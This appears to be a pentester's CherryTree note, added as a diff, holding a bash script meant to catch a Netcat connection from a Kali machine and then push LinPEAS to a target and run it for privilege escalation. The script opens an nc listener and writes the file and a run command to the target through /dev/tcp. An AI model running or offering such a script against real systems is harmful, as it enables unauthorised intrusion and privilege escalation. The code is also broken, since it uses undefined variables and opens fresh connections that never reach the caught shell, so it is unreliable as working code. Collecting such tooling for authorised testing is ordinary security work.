@@ -1,0 +1,42 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node unique_id="10" master_id="0" name="Shit Scripts" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="108" is_bold="1" foreground="#2ec27e" ts_creation="1712710443" ts_lastsave="1712710581">
+    <rich_text>
+</rich_text>
+    <rich_text scale="h1" foreground="#33d17a" weight="heavy">Auto-transfer</rich_text>
+    <rich_text scale="h1" foreground="#ed333b" weight="heavy"> and Execute </rich_text>
+    <rich_text scale="h1" foreground="#33d17a" weight="heavy">LinPEAS</rich_text>
+    <rich_text scale="h1" foreground="#ed333b" weight="heavy"> for </rich_text>
+    <rich_text style="italic" scale="h1" background="#e5a50a" foreground="#e01b24" weight="heavy">Privilege Escalation</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text style="italic" scale="small" weight="heavy">This is a bash script to listen for an incoming Netcat connection and automatically transfer and execute LinPEAS on the target machine.</rich_text>
+    <rich_text style="italic" scale="small">
+</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <codebox char_offset="198" justification="left" frame_width="90" frame_height="100" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">#!/bin/bash
+# Listener setup on Kali
+nc_listener_port=1234
+linpeas_path="/path/to/linpeas.sh"
+
+# Start listener
+nc -lvnp $nc_listener_port | while read line; do
+  echo "$line" | grep -q 'Connection from' &amp;&amp; \
+  {
+    echo "Connection received, transferring linpeas.sh..."
+    # Wait for the shell prompt
+    sleep 1
+    # Transfer linpeas.sh
+    cat $linpeas_path &gt; /dev/tcp/$target/$shell_port
+    echo "linpeas.sh transferred. Running linpeas..."
+    # Command to run linpeas on the target
+    echo "bash linpeas.sh" &gt; /dev/tcp/$target/$shell_port
+  }
+done
+
+</codebox>
+  </node>
+</cherrytree>
